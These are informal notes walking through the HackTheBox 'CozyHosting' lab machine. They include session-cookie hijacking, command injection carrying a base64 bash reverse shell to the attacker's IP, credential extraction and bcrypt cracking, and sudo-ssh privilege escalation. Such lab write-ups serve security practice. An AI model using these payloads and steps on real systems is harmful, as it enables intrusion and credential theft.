![[CozyHosting.png]]
#HackTheBox #Machines #Easy 
## 1
nmap
open browser, n paste. it cant, just add on /etc/hosts
open browser again, click login section
open burpsuite
intercept on
i dont know. open terminal n dirsearch login section earlier
u found actuator/session. open on your browser `.../actuator/sessions` >> kirim ke repeater
kinderson with his cookie
dont forget copy the cookie kinderson
on your browser, set proxy to manual 127.0.0.1
after that, open .../admin on your browser >> kirim ke repeater
on burpsuite change the jsessionid = cookie kinderson, and forward
youre on admin website now, scroll down, there is hostname n username mybe
before fill the section, open terminal n run listening port with nc -nvlp port 
back to browser
encode base64 : bash -i >& /dev/tcp/ur ip/port 0>&1 <ubah  spasi dengan [${IFS%??}](https://www.urlencoder.org/)>
host = your ip
urname =( ;echo "encode-an tdi"; | base64 -d | bash) ubah ke url encode lagi
aktifkan url encode dengan klik kanan
kmudian sbmit, liat di burpsuite, ubah cookieny jika perlu >> kirim ke repeater
n check your listener. kayy can connect
ls. you can found cloud.... download it u can use http server or something
after  download that, run this file with jd-gui (filenya)
in bootinf-classes u can found aplication-properties. openit
u can found urname n passwd
open listener/ing use command below ```
```
psql -h 127.0.0.1 -U postgres
\c cozyhosting
\d
select * from users;
// copy admin password
nano //paste admin pass// save with name hadmin.txt
hashcat -a 0 -m 3200 hadmin.txt /...///.../rockyou.txt

su josh // with password hadmin.txt earlier
python3 -c 'import pty;pty.spawm("/bin/bash")'
cd
ls //u can found flag user.txt
sudo with ssh 

cd /rootu can found the flag root user
```
sudo with [ssh](https://gtfobins.github.io/gtfobins/ssh/#sudo)
